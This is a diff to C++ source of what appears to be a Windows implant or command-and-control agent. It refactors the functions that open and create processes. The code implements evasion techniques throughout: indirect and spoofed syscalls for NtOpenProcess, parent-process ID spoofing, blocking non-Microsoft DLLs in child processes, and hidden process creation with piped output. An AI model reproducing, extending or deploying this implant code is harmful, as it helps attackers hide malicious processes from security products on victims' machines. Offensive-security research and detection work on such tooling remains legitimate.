@@ -11,17 +11,10 @@ auto DECLFN Process::Open(
     CLIENT_ID    ClientID = { .UniqueProcess = UlongToHandle( ProcessID ) };
     OBJECT_ATTRIBUTES ObjAttr = { sizeof(ObjAttr) };
 
-    if ( Flags == SYSCALL_NONE ) {
-        return Self->Krnl32.OpenProcess( RightsAccess, InheritHandle, ProcessID );
-    }
+    if ( ! Flags ) return Self->Krnl32.OpenProcess( RightsAccess, InheritHandle, ProcessID );
 
-    UPTR Address = ( Flags == SYSCALL_SPOOF_INDIRECT )
-        ? (UPTR)Self->Sys->Ext[Sys::OpenProc].Instruction
-        : (UPTR)Self->Ntdll.NtOpenProcess;
-
-    UPTR ssn = ( Flags == SYSCALL_SPOOF_INDIRECT )
-        ? (UPTR)Self->Sys->Ext[Sys::OpenProc].ssn
-        : 0;
+    UPTR Address = SYS_ADDR( Sys::OpenProc );
+    UPTR ssn = SYS_SSN( Sys::OpenProc );
 
     Status = Self->Spf->Call(
         Address, ssn, (UPTR)&Handle, (UPTR)RightsAccess,
@@ -63,34 +56,46 @@ auto DECLFN Process::Create(
 
     PsFlags |= CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT;
 
+    auto Cleanup = [&]( VOID ) -> BOOL {
+        if ( AttrBuff  ) { 
+            Self->Krnl32.DeleteProcThreadAttributeList( AttrBuff );
+            hFree( AttrBuff ); 
+        }
+        if ( PipeWrite ) Self->Ntdll.NtClose( PipeWrite );
+        if ( PipeRead  ) Self->Ntdll.NtClose( PipeRead );
+        if ( PsHandle  ) Self->Ntdll.NtClose( PsHandle );
+
+        return Success;
+    };
+
     if ( UpdateCount ) {
         Self->Krnl32.InitializeProcThreadAttributeList( 0, UpdateCount, 0, &AttrSize );
         AttrBuff = (LPPROC_THREAD_ATTRIBUTE_LIST)hAlloc( AttrSize );
         Success = Self->Krnl32.InitializeProcThreadAttributeList( AttrBuff, UpdateCount, 0, &AttrSize );
-        if ( ! Success ) { goto _KH_END; }
+        if ( ! Success ) { return Cleanup(); }
     }
 
     if ( Self->Config.Ps.ParentID  ) {
         PsHandle = Self->Ps->Open( PROCESS_CREATE_PROCESS | PROCESS_DUP_HANDLE, FALSE, Self->Config.Ps.ParentID );
         if ( ! PsHandle || PsHandle == INVALID_HANDLE_VALUE ) {
-            Success = FALSE; goto _KH_END;
+            Success = FALSE; return Cleanup();
         }
         
         Success = Self->Krnl32.UpdateProcThreadAttribute( AttrBuff, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &PsHandle, sizeof( HANDLE ), 0, 0 );
-        if ( ! Success ) { goto _KH_END; }
+        if ( ! Success ) { return Cleanup(); }
     }
 
     if ( Self->Config.Ps.BlockDlls ) {
         UPTR Policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
         Success = Self->Krnl32.UpdateProcThreadAttribute( AttrBuff, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &Policy, sizeof( UPTR ), nullptr, nullptr );
-        if ( ! Success ) { goto _KH_END; }
+        if ( ! Success ) { return Cleanup(); }
     }
     
     if ( AttrBuff ) { SiEx.lpAttributeList = AttrBuff; }
 
     if ( Self->Config.Ps.Pipe ) {
         Success = Self->Krnl32.CreatePipe( &PipeRead, &PipeWrite, &SecurityAttr, PIPE_BUFFER_LENGTH ); 
-        if ( !Success ) { goto _KH_END; }
+        if ( !Success ) { return Cleanup(); }
 
         SiEx.StartupInfo.hStdError  = PipeWrite;
         SiEx.StartupInfo.hStdOutput = PipeWrite;
@@ -104,12 +109,12 @@ auto DECLFN Process::Create(
             );
             
             if ( ! Success || !PipeDuplic || PipeDuplic == INVALID_HANDLE_VALUE ) { 
-                goto _KH_END; 
+                return Cleanup(); 
             }
             
             Self->Ntdll.NtClose( PipeWrite );
             PipeWrite = PipeDuplic;
-            SiEx.StartupInfo.hStdError = PipeWrite;
+            SiEx.StartupInfo.hStdError  = PipeWrite;
             SiEx.StartupInfo.hStdOutput = PipeWrite;
         }
     }
@@ -125,7 +130,7 @@ auto DECLFN Process::Create(
     }
 
     if ( ! Success ) { 
-        goto _KH_END; 
+        return Cleanup(); 
     }
 
     if ( Self->Config.Ps.Pipe ) {
@@ -163,17 +168,5 @@ auto DECLFN Process::Create(
         }
     }
 
-_KH_END:
-    if ( AttrBuff  ) { 
-        Self->Krnl32.DeleteProcThreadAttributeList( AttrBuff );
-        hFree( AttrBuff ); 
-    }
-    if ( PipeWrite ) Self->Ntdll.NtClose( PipeWrite );
-    if ( PipeRead  ) Self->Ntdll.NtClose( PipeRead );
-    if ( PsHandle  ) Self->Ntdll.NtClose( PsHandle );
-    
-    // if ( PsInfo->hProcess ) Self->Ntdll.NtClose( PsInfo->hProcess );
-    // if ( PsInfo->hThread  ) Self->Ntdll.NtClose( PsInfo->hThread  );
-
-    return Success;
+    return Cleanup();
 }
